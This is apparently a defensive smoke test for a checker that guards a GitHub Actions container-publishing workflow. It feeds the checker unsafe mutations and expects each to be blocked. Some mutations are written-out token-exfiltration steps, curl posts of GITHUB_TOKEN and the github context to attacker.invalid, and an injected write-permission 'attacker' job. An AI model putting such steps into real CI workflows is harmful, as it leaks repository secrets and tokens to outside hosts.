#!/usr/bin/env python3
from __future__ import annotations

import hashlib
import importlib.util
import json
from pathlib import Path
import shutil
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[3]
TOOL = ROOT / "tools/check_github_actions_ghcr_static_plan.py"
REQUIRED = (
    ".dockerignore",
    ".gitattributes",
    ".github/workflows/publish-backend-ghcr.yml",
    "deploy/github-actions-ghcr-static-plan.example.json",
    "deploy/github-actions-ghcr-publish-lifecycle.json",
    "docs/current/GITHUB_ACTIONS_GHCR_STATIC_WORKFLOW_PLAN.md",
    "backend/Dockerfile.production",
    "backend/pyproject.toml",
    "backend/requirements/pip-bootstrap.in",
    "backend/requirements/pip-bootstrap.lock",
    "backend/requirements/runtime.in",
    "backend/requirements/runtime-linux-amd64-py311.lock",
    "backend/requirements/runtime-musllinux-amd64-py311.lock",
    "backend/requirements/dev.in",
    "backend/requirements/dev-linux-amd64-py311.lock",
    "tools/run_smoke_core.sh",
)


def load_tool():
    spec = importlib.util.spec_from_file_location("v328_github_actions_plan", TOOL)
    if spec is None or spec.loader is None:
        raise RuntimeError("cannot load v328 GitHub Actions workflow checker")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def copy_fixture(temp: Path) -> None:
    for relative in REQUIRED:
        source = ROOT / relative
        target = temp / relative
        target.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(source, target)
    mutate_lifecycle(temp, lambda p: (
        p.update({
            "state": "preparation-closed",
            "publishReviewerGateReady": False,
            "approvedPreparationSha": None,
        }),
        p["ownerApproval"].update({"recorded": False, "recordedAtUtc": None}),
        p["closure"].update({
            "authorizationSourceSha": None,
            "closureCommitSha": None,
            "preparedAtUtc": None,
        }),
        p["observedAttempt"].update({
            "runId": None,
            "runUrl": None,
            "runAttempt": None,
            "status": "not-dispatched",
            "conclusion": None,
            "imageDigest": None,
            "signatureVerified": False,
        }),
    ))


def mutate_plan(temp: Path, callback) -> None:
    path = temp / "deploy/github-actions-ghcr-static-plan.example.json"
    payload = json.loads(path.read_text(encoding="utf-8"))
    callback(payload)
    path.write_text(json.dumps(payload, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")


def mutate_lifecycle(temp: Path, callback) -> None:
    path = temp / "deploy/github-actions-ghcr-publish-lifecycle.json"
    payload = json.loads(path.read_text(encoding="utf-8"))
    callback(payload)
    path.write_text(json.dumps(payload, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")


def mutate_workflow(temp: Path, old: str, new: str) -> None:
    path = temp / ".github/workflows/publish-backend-ghcr.yml"
    text = path.read_text(encoding="utf-8")
    if old not in text:
        raise AssertionError(f"workflow fixture marker missing: {old}")
    path.write_text(text.replace(old, new, 1), encoding="utf-8")


def mutate_text(temp: Path, relative: str, old: str, new: str) -> None:
    path = temp / relative
    text = path.read_text(encoding="utf-8")
    if old not in text:
        raise AssertionError(f"text fixture marker missing in {relative}: {old}")
    path.write_text(text.replace(old, new, 1), encoding="utf-8")


def git(temp: Path, *args: str) -> str:
    return subprocess.run(
        ("git", "-C", str(temp), *args),
        check=True,
        capture_output=True,
        text=True,
        encoding="utf-8",
    ).stdout.strip()


def commit_all(temp: Path, message: str) -> str:
    git(temp, "add", ".")
    git(temp, "commit", "-m", message)
    return git(temp, "rev-parse", "HEAD")


def create_closed_authorization_sequence(module, temp: Path) -> tuple[str, str, str]:
    copy_fixture(temp)
    git(temp, "init")
    git(temp, "config", "user.name", "Upgrade RPG smoke")
    git(temp, "config", "user.email", "smoke@example.invalid")
    preparation = commit_all(temp, "preparation closed")
    mutate_lifecycle(temp, lambda p: (
        p.update({
            "state": "authorization-open",
            "publishReviewerGateReady": True,
            "approvedPreparationSha": preparation,
        }),
        p["ownerApproval"].update({
            "recorded": True,
            "recordedAtUtc": "2026-07-22T02:38:00Z",
        }),
        p["githubLiveSettings"].update({"recheckedAtUtc": "2026-07-22T02:38:00Z"}),
    ))
    authorization = commit_all(temp, "authorization open")
    opened = module.inspect_static_workflow_plan(temp)
    assert opened["result"] == module.AUTHORIZATION_OPEN_RESULT
    assert opened["publishGateReady"] is True

    mutate_lifecycle(temp, lambda p: (
        p.update({"state": "authorization-closed-awaiting-evidence", "publishReviewerGateReady": False}),
        p["closure"].update({
            "authorizationSourceSha": authorization,
            "closureCommitSha": None,
            "preparedAtUtc": "2026-07-22T02:40:00Z",
        }),
        p["observedAttempt"].update({
            "runId": 123456,
            "runUrl": "https://github.com/gihohoho/upgrade-rpg/actions/runs/123456",
            "runAttempt": 1,
            "status": "queued",
        }),
    ))
    closure = commit_all(temp, "authorization closed")
    closed = module.inspect_static_workflow_plan(temp)
    assert closed["result"] == module.AUTHORIZATION_CLOSED_RESULT
    assert closed["publishGateReady"] is False
    return preparation, authorization, closure


def expect_blocked(module, temp: Path, label: str = "unknown mutation") -> None:
    try:
        module.inspect_static_workflow_plan(temp)
    except module.StaticWorkflowPlanError:
        return
    raise AssertionError(f"unsafe v326 GitHub Actions workflow fixture was not blocked: {label}")


def expect_semantically_blocked(module, temp: Path, label: str) -> None:
    workflow_path = temp / ".github/workflows/publish-backend-ghcr.yml"
    workflow = workflow_path.read_text(encoding="utf-8")
    mutated_source_sha256 = hashlib.sha256(workflow.encode("utf-8")).hexdigest()
    mutate_plan(temp, lambda payload: payload.update({"workflowSourceSha256": mutated_source_sha256}))
    original_source_sha256 = module.EXPECTED_WORKFLOW_SHA256
    module.EXPECTED_WORKFLOW_SHA256 = mutated_source_sha256
    try:
        expect_blocked(module, temp, f"semantic lock: {label}")
    finally:
        module.EXPECTED_WORKFLOW_SHA256 = original_source_sha256


def expect_structurally_blocked(module, temp: Path, label: str) -> None:
    workflow_path = temp / ".github/workflows/publish-backend-ghcr.yml"
    workflow = workflow_path.read_text(encoding="utf-8")
    mutated_source_sha256 = hashlib.sha256(workflow.encode("utf-8")).hexdigest()
    mutated_semantic_sha256 = module._canonical_sha256(module._load_workflow(workflow))
    mutate_plan(temp, lambda payload: payload.update({
        "workflowSourceSha256": mutated_source_sha256,
        "workflowSemanticSha256": mutated_semantic_sha256,
    }))
    original_source_sha256 = module.EXPECTED_WORKFLOW_SHA256
    original_semantic_sha256 = module.EXPECTED_WORKFLOW_SEMANTIC_SHA256
    module.EXPECTED_WORKFLOW_SHA256 = mutated_source_sha256
    module.EXPECTED_WORKFLOW_SEMANTIC_SHA256 = mutated_semantic_sha256
    try:
        expect_blocked(module, temp, f"per-step structural lock: {label}")
    finally:
        module.EXPECTED_WORKFLOW_SHA256 = original_source_sha256
        module.EXPECTED_WORKFLOW_SEMANTIC_SHA256 = original_semantic_sha256


def expect_secret_expression_blocked(module, temp: Path, label: str, run_step_key: str) -> None:
    workflow_path = temp / ".github/workflows/publish-backend-ghcr.yml"
    workflow = workflow_path.read_text(encoding="utf-8")
    payload = module._load_workflow(workflow)
    mutated_source_sha256 = hashlib.sha256(workflow.encode("utf-8")).hexdigest()
    mutated_semantic_sha256 = module._canonical_sha256(payload)
    job_name, step_name = run_step_key.split(":", 1)
    run = next(
        step["run"]
        for step in payload["jobs"][job_name]["steps"]
        if step["name"] == step_name
    )
    mutated_run_sha256 = hashlib.sha256(run.encode("utf-8")).hexdigest()
    mutate_plan(temp, lambda plan: plan.update({
        "workflowSourceSha256": mutated_source_sha256,
        "workflowSemanticSha256": mutated_semantic_sha256,
    }))
    original_source_sha256 = module.EXPECTED_WORKFLOW_SHA256
    original_semantic_sha256 = module.EXPECTED_WORKFLOW_SEMANTIC_SHA256
    original_run_sha256 = module.EXPECTED_RUN_STEP_SHA256[run_step_key]
    module.EXPECTED_WORKFLOW_SHA256 = mutated_source_sha256
    module.EXPECTED_WORKFLOW_SEMANTIC_SHA256 = mutated_semantic_sha256
    module.EXPECTED_RUN_STEP_SHA256[run_step_key] = mutated_run_sha256
    try:
        try:
            module.inspect_static_workflow_plan(temp)
        except module.StaticWorkflowPlanError as exc:
            if "secret/token expression" not in str(exc):
                raise AssertionError(f"unexpected blocker for {label}: {exc}") from exc
        else:
            raise AssertionError(f"parsed secret expression was not blocked: {label}")
    finally:
        module.EXPECTED_WORKFLOW_SHA256 = original_source_sha256
        module.EXPECTED_WORKFLOW_SEMANTIC_SHA256 = original_semantic_sha256
        module.EXPECTED_RUN_STEP_SHA256[run_step_key] = original_run_sha256


def main() -> int:
    module = load_tool()
    result = module.inspect_static_workflow_plan(ROOT)
    assert result["result"] == module.ATTEMPT_RECORDED_RESULT
    assert result["trigger"] == "workflow_dispatch-only"
    assert result["workflowFilePresent"] is True
    assert result["workflowSourceSha256"] == module.EXPECTED_WORKFLOW_SHA256
    assert result["workflowSemanticSha256"] == module.EXPECTED_WORKFLOW_SEMANTIC_SHA256
    assert result["workflowCreationApproved"] is True
    assert result["workflowExecutionApproved"] is True
    assert result["workflowExecutionExecuted"] is True
    assert result["actionShasApproved"] is True
    assert result["actionsSettingsConfigured"] is True
    assert result["publishEnvironmentExists"] is True
    assert result["publishEnvironmentConfigured"] is False
    assert result["publishLifecycleState"] == "attempt-recorded"
    assert result["publishGateReady"] is False
    assert result["approvedPreparationSha"] == "13b15409929d77b4e6209481596e4f4550a22ba5"
    assert result["dockerBuildContextEnvExcluded"] is True
    assert result["reproducibleBuildReady"] is True
    assert result["supplyChainGate"] == "fail-closed"

    with tempfile.TemporaryDirectory() as temp_dir:
        temp = Path(temp_dir)
        copy_fixture(temp)
        fixture_result = module.inspect_static_workflow_plan(temp)
        assert fixture_result["publishLifecycleState"] == "preparation-closed"
        assert fixture_result["publishGateReady"] is False

    plan_mutations = (
        lambda p: p["triggerPolicy"]["allowedEvents"].append("push"),
        lambda p: p["permissionsPolicy"]["buildScanJob"].update({"packages": "write"}),
        lambda p: p["permissionsPolicy"]["publishSignVerifyJob"].update({"contents": "write"}),
        lambda p: p["permissionsPolicy"].update({"githubArtifactAttestationsPermission": "write"}),
        lambda p: p["actionPolicy"].update({"resolvedActionShasApproved": False}),
        lambda p: p["actionPolicy"]["allowlist"][0].update({"approvedSha": "0" * 40}),
        lambda p: p["actionPolicy"]["allowlist"][0].update({"upstreamTagCommitVerified": False}),
        lambda p: p.update({"workflowSourceSha256": "0" * 64}),
        lambda p: p.update({"workflowSemanticSha256": "0" * 64}),
        lambda p: p["dockerBuildContextPolicy"].update({"environmentReincludeAllowed": True}),
        lambda p: p["dockerBuildContextPolicy"].update({"dockerfileSpecificIgnoreAllowed": True}),
        lambda p: p["supplyChainGates"]["reproducibilityGate"].update({"status": "ready"}),
        lambda p: p["supplyChainGates"]["reproducibilityGate"].update({"sameSourceDeterministicBuildGuaranteed": True}),
        lambda p: p["supplyChainGates"]["vulnerabilityGate"].update({"severity": ["CRITICAL"]}),
        lambda p: p["supplyChainGates"]["vulnerabilityGate"].update({"ignoreUnfixed": True}),
        lambda p: p["supplyChainGates"].update({"automaticDeployment": True}),
        lambda p: p["repositoryReview"]["actionsSettings"].update({"allowedActions": "all"}),
        lambda p: p["repositoryReview"].update({"liveRecheckRequiredBeforeGateChange": False}),
        lambda p: p["repositoryReview"]["publishEnvironment"].update({"variablesCount": 1}),
        lambda p: p["requiredRepositorySetup"].update({"sourceControlledLifecyclePolicyReady": False}),
        lambda p: p["triggerPolicy"]["environment"].update({"gateValueDerivedFromLifecycleState": False}),
        lambda p: p["supplyChainGates"]["vulnerabilityGate"].update({"assetSha256": "0" * 64}),
        lambda p: p["ownerOnlyApprovalPolicy"].update({"runAttemptMustEqual": 2}),
        lambda p: p["ownerOnlyApprovalPolicy"].update({"singleDispatchApiCheckRequired": False}),
        lambda p: p["ownerOnlyApprovalPolicy"].update({"authorizationChangedPaths": ["README.md"]}),
        lambda p: p["ownerOnlyApprovalPolicy"].update({"allowedLifecycleStates": ["preparation-closed"]}),
        lambda p: p["transientAuthorizationSmokePolicy"].update({"enabledValue": "2"}),
        lambda p: p["transientAuthorizationSmokePolicy"].update({"allOtherCoreSmokesRemainRequired": False}),
        lambda p: p["transientAuthorizationSmokePolicy"]["skippedClosedRootSmokes"].append("python unsafe.py"),
        lambda p: p["attemptEvidencePolicy"].update({"codeWorkflowCheckerChangesAllowed": True}),
        lambda p: p["attemptEvidencePolicy"].update({"nextPreparationPreservesPriorAttemptEvidence": False}),
        lambda p: p["attemptEvidencePolicy"]["firstRecordChangedPathAllowlist"].append("tools/check_github_actions_ghcr_static_plan.py"),
        lambda p: p["repositoryReview"]["actionsSettings"]["forkPullRequestWorkflows"].update({"sendWriteTokens": True}),
        lambda p: p["repositoryReview"]["actionsSettings"]["forkPullRequestWorkflows"].update({"sendSecretsAndVariables": True}),
    )
    for index, mutation in enumerate(plan_mutations, start=1):
        with tempfile.TemporaryDirectory() as temp_dir:
            temp = Path(temp_dir)
            copy_fixture(temp)
            mutate_plan(temp, mutation)
            expect_blocked(module, temp, f"plan mutation {index}")

    lifecycle_mutations = (
        lambda p: p.update({"unexpectedSecret": "must-not-be-accepted"}),
        lambda p: p.update({"publishReviewerGateReady": True}),
        lambda p: p.update({"state": "unknown-state"}),
        lambda p: p.update({"priorApprovedPreparationSha": "0" * 40}),
        lambda p: p["priorAttemptEvidence"].update({"runId": 1}),
        lambda p: p["ownerApproval"].update({"recorded": True}),
        lambda p: p["ownerApproval"].update({"unexpected": "blocked"}),
        lambda p: p["githubLiveSettings"].update({"recheckedAtUtc": "2026-07-20"}),
        lambda p: p["githubLiveSettings"].update({"forkWriteTokensEnabled": True}),
        lambda p: p["githubLiveSettings"].update({"forkSecretsEnabled": True}),
        lambda p: p["authorizationPolicy"].update({"workflowRunAttemptMustEqual": 2}),
        lambda p: p["authorizationPolicy"].update({"singleDispatchApiCheckRequired": False}),
        lambda p: p["authorizationPolicy"].update({"authorizationChangedPaths": ["README.md"]}),
        lambda p: p["observedAttempt"].update({"status": "completed"}),
    )
    for index, mutation in enumerate(lifecycle_mutations, start=1):
        with tempfile.TemporaryDirectory() as temp_dir:
            temp = Path(temp_dir)
            copy_fixture(temp)
            mutate_lifecycle(temp, mutation)
            expect_blocked(module, temp, f"lifecycle mutation {index}")

    with tempfile.TemporaryDirectory() as temp_dir:
        temp = Path(temp_dir)
        copy_fixture(temp)
        mutate_lifecycle(temp, lambda p: (
            p.update({
                "state": "authorization-open",
                "publishReviewerGateReady": True,
                "approvedPreparationSha": module.PRIOR_APPROVED_PREPARATION_SHA,
            }),
            p["ownerApproval"].update({
                "recorded": True,
                "recordedAtUtc": "2026-07-20T04:00:00Z",
            }),
        ))
        expect_blocked(module, temp, "authorization-open fixture without Git history")

    with tempfile.TemporaryDirectory() as temp_dir:
        temp = Path(temp_dir)
        preparation, authorization, closure = create_closed_authorization_sequence(module, temp)
        mutate_lifecycle(temp, lambda p: (
            p.update({"state": "attempt-recorded"}),
            p["closure"].update({"closureCommitSha": closure}),
            p["observedAttempt"].update({
                "status": "completed",
                "conclusion": "success",
                "imageDigest": "sha256:" + "a" * 64,
                "signatureVerified": True,
            }),
        ))
        record = commit_all(temp, "record completed attempt")
        recorded = module.inspect_static_workflow_plan(temp)
        assert recorded["result"] == module.ATTEMPT_RECORDED_RESULT
        assert recorded["publishLifecycleState"] == "attempt-recorded"
        assert recorded["publishGateReady"] is False
        assert recorded["approvedPreparationSha"] == preparation
        assert recorded["attemptRecordCommitSha"] == record
        stable_path = temp / "README.md"
        stable_path.write_text("stable post-record state\n", encoding="utf-8")
        commit_all(temp, "normal post-record documentation")
        stable = module.inspect_static_workflow_plan(temp)
        assert stable["result"] == module.ATTEMPT_RECORDED_RESULT
        assert stable["attemptRecordCommitSha"] == record

    with tempfile.TemporaryDirectory() as temp_dir:
        temp = Path(temp_dir)
        _, _, closure = create_closed_authorization_sequence(module, temp)
        mutate_lifecycle(temp, lambda p: (
            p.update({"state": "attempt-recorded"}),
            p["closure"].update({"closureCommitSha": closure}),
            p["observedAttempt"].update({
                "status": "completed",
                "conclusion": "success",
                "imageDigest": None,
                "signatureVerified": False,
            }),
        ))
        commit_all(temp, "invalid successful attempt evidence")
        expect_blocked(module, temp, "success without digest and verified signature")

    with tempfile.TemporaryDirectory() as temp_dir:
        temp = Path(temp_dir)
        _, _, closure = create_closed_authorization_sequence(module, temp)
        mutate_lifecycle(temp, lambda p: (
            p.update({"state": "attempt-recorded"}),
            p["closure"].update({"closureCommitSha": closure}),
            p["observedAttempt"].update({
                "status": "completed",
                "conclusion": "failure",
                "imageDigest": None,
                "signatureVerified": False,
            }),
        ))
        unsafe = temp / "backend/app/unsafe-evidence-change.py"
        unsafe.parent.mkdir(parents=True, exist_ok=True)
        unsafe.write_text("raise RuntimeError('unsafe')\n", encoding="utf-8")
        commit_all(temp, "attempt evidence with unsafe code change")
        expect_blocked(module, temp, "attempt evidence changed code outside allowlist")

    workflow_mutations = (
        ("  workflow_dispatch:\n", "  push:\n"),
        ("  workflow_dispatch:\n", "  \"push\":\n"),
        (
            "jobs:\n  validate:\n",
            "jobs:\n  attacker:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n      packages: write\n    steps:\n      - name: Unsafe extra job\n        run: echo unsafe\n  validate:\n",
        ),
        (
            "actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0",
            "actions/checkout@v7",
        ),
        ("--severity HIGH,CRITICAL", "--severity CRITICAL"),
        ("--python-version 3.11", "--python-version 3"),
        ("--ignore-unfixed=false", "--ignore-unfixed=true"),
        (
            "TRIVY_SHA256: 8b4376d5d6befe5c24d503f10ff136d9e0c49f9127a4279fd110b727929a5aa9",
            "TRIVY_SHA256: " + "0" * 64,
        ),
        ("context: .", "context: backend"),
        ("provenance: mode=max", "provenance: mode=min"),
        ("sbom: true", "sbom: false"),
        ('  DOCKER_BUILD_RECORD_UPLOAD: "false"\n', '  DOCKER_BUILD_RECORD_UPLOAD: "true"\n'),
        ('  DOCKER_BUILD_RECORD_UPLOAD: "false"\n', ""),
        (
            'require(os.environ["EXPECTED_RUN_ATTEMPT"] == "1", "workflow re-runs are forbidden")',
            'require(True, "workflow re-runs are forbidden")',
        ),
        ("actions/workflows/", "actions/runs/"),
        (
            "if: ${{ always() && steps.publish.outputs.digest != '' }}",
            "if: ${{ steps.publish.outputs.digest != '' }}",
        ),
        (
            "SKIP_GHCR_HANDOFF_SMOKES=1 bash tools/run_smoke_core.sh",
            "bash tools/run_smoke_core.sh",
        ),
        (
            "SKIP_GHCR_HANDOFF_SMOKES=1 bash tools/run_smoke_core.sh",
            "SKIP_GHCR_HANDOFF_SMOKES=2 bash tools/run_smoke_core.sh",
        ),
        (
            "python tools/check_github_actions_ghcr_static_plan.py --strict\n",
            "",
        ),
        ("password: ${{ secrets.GITHUB_TOKEN }}", "password: ${{ secrets.GHCR_PAT }}"),
        ("tags: ${{ env.IMAGE_REPOSITORY }}:unverified-sha-${{ github.sha }}", "tags: ${{ env.IMAGE_REPOSITORY }}:latest"),
        (
            '            "$IMAGE_REPOSITORY@$DIGEST"\n',
            '            "$IMAGE_REPOSITORY@$DIGEST" || true\n',
        ),
        (
            "    steps:\n      - name: Check manual approval inputs\n",
            "    steps:\n      - name: Exfiltrate token\n        env:\n          TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        run: curl --data \"$TOKEN\" https://attacker.invalid\n      - name: Check manual approval inputs\n",
        ),
        (
            "      - name: Run fail-closed repository checks\n        run: |\n",
            "      - name: Run fail-closed repository checks\n        if: false\n        run: |\n",
        ),
    )
    for old, new in workflow_mutations:
        with tempfile.TemporaryDirectory() as temp_dir:
            temp = Path(temp_dir)
            copy_fixture(temp)
            mutate_workflow(temp, old, new)
            expect_blocked(module, temp, f"workflow mutation {old!r} -> {new!r}")
            expect_semantically_blocked(module, temp, f"workflow mutation {old!r} -> {new!r}")
            expect_structurally_blocked(module, temp, f"workflow mutation {old!r} -> {new!r}")

    smoke_core_mutations = (
        (
            'if [[ "${SKIP_GHCR_HANDOFF_SMOKES:-0}" != "1" ]]; then',
            'if [[ "${SKIP_GHCR_HANDOFF_SMOKES:-0}" != "2" ]]; then',
        ),
        (
            'if [[ "${SKIP_GHCR_HANDOFF_SMOKES:-0}" != "1" ]]; then',
            'if [[ "${SKIP_ALL_SMOKES:-0}" != "1" ]]; then',
        ),
        (
            "  python tools/smoke/game/smoke_next_chat_handoff.py\nfi",
            "  python tools/smoke/game/smoke_next_chat_handoff.py\n  python unsafe.py\nfi",
        ),
    )
    for old, new in smoke_core_mutations:
        with tempfile.TemporaryDirectory() as temp_dir:
            temp = Path(temp_dir)
            copy_fixture(temp)
            mutate_text(temp, "tools/run_smoke_core.sh", old, new)
            expect_blocked(module, temp, f"core smoke skip mutation {old!r} -> {new!r}")

    dockerignore_mutations = (
        ("**/.env\n", ""),
        ("!deploy/secrets/README.md\n", "!deploy/secrets/README.md\n!backend/.env\n"),
        ("!deploy/secrets/README.md\n", "!deploy/secrets/README.md\n!backend/*\n"),
        ("!deploy/secrets/README.md\n", "!deploy/secrets/README.md\n!backend/**\n"),
        ("!deploy/secrets/README.md\n", "!deploy/secrets/README.md\n!**/*\n"),
    )
    for old, new in dockerignore_mutations:
        with tempfile.TemporaryDirectory() as temp_dir:
            temp = Path(temp_dir)
            copy_fixture(temp)
            path = temp / ".dockerignore"
            text = path.read_text(encoding="utf-8")
            if old not in text:
                raise AssertionError(f"dockerignore fixture marker missing: {old!r}")
            path.write_text(text.replace(old, new, 1), encoding="utf-8")
            expect_blocked(module, temp, f"dockerignore mutation {old!r} -> {new!r}")

    with tempfile.TemporaryDirectory() as temp_dir:
        temp = Path(temp_dir)
        copy_fixture(temp)
        override = temp / "backend/Dockerfile.production.dockerignore"
        override.parent.mkdir(parents=True, exist_ok=True)
        override.write_text("*\n", encoding="utf-8")
        expect_blocked(module, temp, "Dockerfile-specific .dockerignore override")

    secret_expression_mutations = (
        '${{ github[\'token\'] }}',
        "${{ toJSON(github) }}",
    )
    emit_marker = '          echo "Verified candidate: $IMAGE_REPOSITORY@$DIGEST" >> "$GITHUB_STEP_SUMMARY"\n'
    emit_step_key = "publish_sign_verify:Emit verified candidate digest"
    for expression in secret_expression_mutations:
        with tempfile.TemporaryDirectory() as temp_dir:
            temp = Path(temp_dir)
            copy_fixture(temp)
            mutate_workflow(
                temp,
                emit_marker,
                f'          curl --fail --data "{expression}" https://attacker.invalid\n',
            )
            expect_secret_expression_blocked(module, temp, expression, emit_step_key)

    print("OK: v329 GitHub Actions/GHCR recorded provenance failure smoke passed")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
